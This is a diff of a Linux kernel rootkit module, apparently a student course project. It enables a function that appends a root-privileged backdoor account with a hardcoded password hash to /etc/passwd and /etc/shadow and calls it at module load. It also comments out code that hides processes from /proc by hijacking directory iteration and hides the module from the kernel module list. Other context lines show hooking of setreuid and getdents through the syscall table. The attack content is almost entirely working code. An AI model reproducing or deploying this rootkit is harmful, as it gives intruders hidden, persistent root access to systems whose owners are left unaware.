@@ -56,136 +56,139 @@ asmlinkage long our_setreuid(const struct pt_regs *regs){
 // End Brendan
 
 // Start Marc - Inserting/removing backdoor & hide backdoor entrance
-// void add_backdoor(char *path) {
+void add_backdoor(char *path) {
 	
-// 		char* backdoor_password = "rootkituser1:x:12345:0:backdoor:/home:/bin/bash\n";
-// 		char* backdoor_shadow = "rootkituser:$6$zTDiFKXM$SuJZFgTirs8r9O9PTskLTnvNV1tvMLiS6h87/c3xrRJEahO5q7bJTT5fgNZWPFrYskf6aNjwKto2dixpTr1Zw0:18232:0:99999:7:::\n";
-// 		// PASSWORD (encodes in SHA 512) = cse331!	
+		char* backdoor_password = "rootkituser1:x:12345:0:backdoor:/home:/bin/bash\n";
+		char* backdoor_shadow = "rootkituser:$6$zTDiFKXM$SuJZFgTirs8r9O9PTskLTnvNV1tvMLiS6h87/c3xrRJEahO5q7bJTT5fgNZWPFrYskf6aNjwKto2dixpTr1Zw0:18232:0:99999:7:::\n";
+		// PASSWORD (encodes in SHA 512) = cse331!	
 		
-// 		struct file *file;
-// 		char *backdoor;
-// 		mm_segment_t old_fs;
+		struct file *file;
+		char *backdoor;
+		mm_segment_t old_fs;
 		
-// 		char *buffer;
-// 		int page_count = 0;
+		char *buffer;
+		int page_count = 0;
 	
-// 		bool backdoor_existing = false; // If backdoor with same name already exists
+		bool backdoor_existing = false; // If backdoor with same name already exists
 		
 		
-// 		loff_t offset; // Offset used for determining location of new user in list
+		loff_t offset; // Offset used for determining location of new user in list
 		
-// 		unsigned long ret;
+		unsigned long ret;
 		
-// 		if (strcmp(path, "/etc/passwd") == 0) // If adding into passwd file
-// 			{backdoor = backdoor_password;}
-// 		if (strcmp(path, "/etc/shadow") == 0) // If adding into shadow file
-// 			{backdoor = backdoor_shadow;}
+		if (strcmp(path, "/etc/passwd") == 0) // If adding into passwd file
+			{backdoor = backdoor_password;}
+		if (strcmp(path, "/etc/shadow") == 0) // If adding into shadow file
+			{backdoor = backdoor_shadow;}
 		
-// 		old_fs = get_fs(); 
+		old_fs = get_fs(); 
 		
-// 		set_fs(get_ds()); 
-// 	    	file = filp_open(path, O_RDWR, 0); 
-// 	    	set_fs(old_fs); 
+		set_fs(get_ds()); 
+	    	file = filp_open(path, O_RDWR, 0); 
+	    	set_fs(old_fs); 
 
-// 	    	if(IS_ERR(file)){
-// 			goto exit;
-// // 			return 0;
-// 	    	}
+	    	if(IS_ERR(file)){
+			goto exit;
+// 			return 0;
+	    	}
 
-// 	    	//check if backdoor already exists
-// 	    	buffer = (char *) kmalloc(PAGE_SIZE, GFP_KERNEL);
+	    	//check if backdoor already exists
+	    	buffer = (char *) kmalloc(PAGE_SIZE, GFP_KERNEL);
 
-// 	    	if(!buffer){
-// 			goto cleanup1;
+	    	if(!buffer){
+			goto cleanup1;
 			
-// // 			 if(file)
-// // 			 	{filp_close(file, NULL);}
-// // 			return 0;
-// 	    	}
+// 			 if(file)
+// 			 	{filp_close(file, NULL);}
+// 			return 0;
+	    	}
 
-// 	    	backdoor_existing = false;
-// 	    	ret = PAGE_SIZE;
-// 	    	offset = 0;
-// 	    	while(ret == PAGE_SIZE){
-// 			offset = page_count*PAGE_SIZE;
+	    	backdoor_existing = false;
+	    	ret = PAGE_SIZE;
+	    	offset = 0;
+	    	while(ret == PAGE_SIZE){
+			offset = page_count*PAGE_SIZE;
 
-// 			set_fs(get_ds());
-// 			ret = vfs_read(file, buffer, PAGE_SIZE, &offset);
-// 			set_fs(old_fs);
+			set_fs(get_ds());
+			ret = vfs_read(file, buffer, PAGE_SIZE, &offset);
+			set_fs(old_fs);
 
-// 			if(ret < 0){
+			if(ret < 0){
 				
-// 				goto cleanup2;
-// // 		    		if(buffer)
-// // 					{kfree(buffer);}
-// // 		    	if(file)
-// // 		    		{filp_close(file, NULL);}
-// // 			return offset;
-// 			}
+				goto cleanup2;
+				
+// 		    		if(buffer)
+// 					{kfree(buffer);}
+// 		    	if(file)
+// 		    		{filp_close(file, NULL);}
+// 			return offset;
+			}
 
-// 			page_count++;
+			page_count++;
 
-// 			if(strstr(buffer, backdoor)){
-// 			    backdoor_existing = true;
-// 			    break;
-// 			}
-// 	    	}
+			if(strstr(buffer, backdoor)){
+			    backdoor_existing = true;
+			    break;
+			}
+	    	}
 
-// 	    	if(backdoor_existing){
-// 			goto cleanup2;
-// // 			if(buffer)
-// // 				{kfree(buffer);}
-// // 		    if(file)
-// // 		    	{filp_close(file, NULL);}
-// // 		return offset;
+	    	if(backdoor_existing){
+			goto cleanup2;
 			
-// 		    }
-
-// 	    	//seek offset to end of file
-// 	    	offset = 0;
-
-// 	    	set_fs(get_ds());
-// 	    	offset = vfs_llseek(file, offset, SEEK_END);
-// 	    	set_fs(old_fs);
-
-// 	    	if(offset < 0){
-// 			goto cleanup2;
-			
-// // 			if(buffer)
-// // 				{kfree(buffer);}
-// // 		    if(file)
-// // 		    	{filp_close(file, NULL);}
-// // 		return;
-			
-// 		}
-
-// 		//insert backdoor to the end of file
-// 		ret = 0;
-// 	    	set_fs(get_ds()); 
-// 		ret = vfs_write(file, backdoor, strlen(backdoor),&offset); 
-// 		set_fs(old_fs); 
-	
-// 		if(ret<0){
-			
-// 			goto cleanup2;
-// // 			if(buffer)
-// // 				{kfree(buffer);}
-// // 		    if(file)
-// // 		    	{filp_close(file, NULL);}
-// // 		return offset;
-// 	    	}
-
-// 		cleanup2:
-// 		    if(buffer)
-// 			kfree(buffer);
-	
-// 		cleanup1:
+// 			if(buffer)
+// 				{kfree(buffer);}
 // 		    if(file)
-// 			filp_close(file, NULL);
+// 		    	{filp_close(file, NULL);}
+// 		return offset;
+			
+		    }
+
+	    	//seek offset to end of file
+	    	offset = 0;
+
+	    	set_fs(get_ds());
+	    	offset = vfs_llseek(file, offset, SEEK_END);
+	    	set_fs(old_fs);
+
+	    	if(offset < 0){
+			goto cleanup2;
+			
+// 			if(buffer)
+// 				{kfree(buffer);}
+// 		    if(file)
+// 		    	{filp_close(file, NULL);}
+// 		return;
+			
+		}
+
+		//insert backdoor to the end of file
+		ret = 0;
+	    	set_fs(get_ds()); 
+		ret = vfs_write(file, backdoor, strlen(backdoor),&offset); 
+		set_fs(old_fs); 
 	
-// 		exit:
-// 		    return;
-// }
+		if(ret<0){
+			
+			goto cleanup2;
+			
+// 			if(buffer)
+// 				{kfree(buffer);}
+// 		    if(file)
+// 		    	{filp_close(file, NULL);}
+// 		return offset;
+	    	}
+
+		cleanup2:
+		    if(buffer)
+			kfree(buffer);
+	
+		cleanup1:
+		    if(file)
+			filp_close(file, NULL);
+	
+		exit:
+		    return;
+}
 
 // void hide_backdoor (void) {
 	
@@ -259,44 +262,44 @@ asmlinkage int sys_getdents_hook(unsigned int fd, struct linux_dirent* dirp, uns
 // END BRIAN
 
 
-//START CARLOS
-//iterate takes pointer to dir_context	
-struct list_head *module_list;//reference to module_list. Used to hide mod from insmod
-int count;
-static char* rkps[10];
-module_param_array(rkps, charp, &count, 0);
-static char *proc_to_hide = "1";
-static char *proc_to_hide1 = "3538";
-static struct file_operations proc_fops;//pointers to listing contents in proc dir
-static struct file_operations *backup_proc_fops;//keep backup in order to restore orginal struct 
-static struct inode *proc_inode;
-static struct path p;
-struct dir_context *backup_ctx;
+// //START CARLOS
+// //iterate takes pointer to dir_context	
+// struct list_head *module_list;//reference to module_list. Used to hide mod from insmod
+// int count;
+// static char* rkps[10];
+// module_param_array(rkps, charp, &count, 0);
+// static char *proc_to_hide = "1";
+// static char *proc_to_hide1 = "3538";
+// static struct file_operations proc_fops;//pointers to listing contents in proc dir
+// static struct file_operations *backup_proc_fops;//keep backup in order to restore orginal struct 
+// static struct inode *proc_inode;
+// static struct path p;
+// struct dir_context *backup_ctx;
  
-static int overwritten_filldir_t(struct dir_context *ctx, const char *proc_name, int len, loff_t off, u64 ino, unsigned int d_type){
-    //prints contents 
-    int i;
-    for(i = 0; i< sizeof(rkps)/sizeof(rkps[0]); i++){
-	    if(rkps[i] != NULL) if (strncmp(proc_name, rkps[i], strlen(rkps[i])) == 0) return 0;
-    }
-    return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);//return orginal pointer to  dir_context.Prints it off.
-}
+// static int overwritten_filldir_t(struct dir_context *ctx, const char *proc_name, int len, loff_t off, u64 ino, unsigned int d_type){
+//     //prints contents 
+//     int i;
+//     for(i = 0; i< sizeof(rkps)/sizeof(rkps[0]); i++){
+// 	    if(rkps[i] != NULL) if (strncmp(proc_name, rkps[i], strlen(rkps[i])) == 0) return 0;
+//     }
+//     return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);//return orginal pointer to  dir_context.Prints it off.
+// }
 
-struct dir_context hacked_ctx = {
-    .actor = overwritten_filldir_t,//Evil struct
-};
+// struct dir_context hacked_ctx = {
+//     .actor = overwritten_filldir_t,//Evil struct
+// };
 
-//getdents() calls iterate_dir() which calls iterate_shared()
-int overwritten_iterate_shared(struct file *file, struct dir_context *ctx){
-    printk(KERN_INFO "@$@!: rk_iterate_shared"); 
-    int result = 0;
-    hacked_ctx.pos = ctx->pos;
-    backup_ctx = ctx;
-    result = backup_proc_fops->iterate_shared(file, &hacked_ctx);
-    ctx->pos = hacked_ctx.pos;
-    return result;
-}
-//END  CARLOS  
+// //getdents() calls iterate_dir() which calls iterate_shared()
+// int overwritten_iterate_shared(struct file *file, struct dir_context *ctx){
+//     printk(KERN_INFO "@$@!: rk_iterate_shared"); 
+//     int result = 0;
+//     hacked_ctx.pos = ctx->pos;
+//     backup_ctx = ctx;
+//     result = backup_proc_fops->iterate_shared(file, &hacked_ctx);
+//     ctx->pos = hacked_ctx.pos;
+//     return result;
+// }
+// //END  CARLOS  
 
 
 
@@ -318,14 +321,14 @@ static int __init rootkit_init(void){
 	
 // 	int offset;
 	
-// 	add_backdoor(password_file);
+	add_backdoor(password_file);
 	
 // 	offset = add_backdoor(password_file);
 	
 // 	original_getdents = (void *)sys_call_address[offset];                        \
 //     	sys_call_address[offset] = (unsigned long*)&original_getdents;
 	
-// 	add_backdoor(shadow_file);
+	add_backdoor(shadow_file);
 	
 //    	offset = add_backdoor(shadow_file);
 	
@@ -350,21 +353,21 @@ static int __init rootkit_init(void){
 	printk(KERN_INFO "setreuid replaced\n");
 	// End Brendan
 
-	//Start Carlos
-	//module_list = THIS_MODULE->list.prev;//moves pointer
-    	//list_del(&THIS_MODULE->list);//del the current pointer. Removes module from insmod.
-	printk(KERN_INFO "@$@?: The process is \"%s\" (pid %i)\n", current->comm, current->pid);
-	if(kern_path("/proc", 0, &p)){
-        	printk(KERN_INFO "@%@?: System forced to exit becaus path for /proc not found");
-		return 0;
-	}
-	proc_inode = p.dentry->d_inode;/*get the inode*/
-    	proc_fops = *proc_inode->i_fop;/* get a copy of file_oprartions from inode*/
-   	backup_proc_fops = proc_inode->i_fop;/* back up file_operation*/
-  	proc_fops.iterate_shared = overwritten_iterate_shared; /* modify copy without hijacked function */
-   	proc_inode->i_fop = &proc_fops; /* overwrite the proc entry file operations */
-	printk(KERN_INFO "@$@?: Process in hiding");
-	//End Carlos
+// 	//Start Carlos
+// 	//module_list = THIS_MODULE->list.prev;//moves pointer
+//     	//list_del(&THIS_MODULE->list);//del the current pointer. Removes module from insmod.
+// 	printk(KERN_INFO "@$@?: The process is \"%s\" (pid %i)\n", current->comm, current->pid);
+// 	if(kern_path("/proc", 0, &p)){
+//         	printk(KERN_INFO "@%@?: System forced to exit becaus path for /proc not found");
+// 		return 0;
+// 	}
+// 	proc_inode = p.dentry->d_inode;/*get the inode*/
+//     	proc_fops = *proc_inode->i_fop;/* get a copy of file_oprartions from inode*/
+//    	backup_proc_fops = proc_inode->i_fop;/* back up file_operation*/
+//   	proc_fops.iterate_shared = overwritten_iterate_shared; /* modify copy without hijacked function */
+//    	proc_inode->i_fop = &proc_fops; /* overwrite the proc entry file operations */
+// 	printk(KERN_INFO "@$@?: Process in hiding");
+// 	//End Carlos
 		
 
 	write_cr0(read_cr0() | 0x10000); // This will make the sys call table read only again
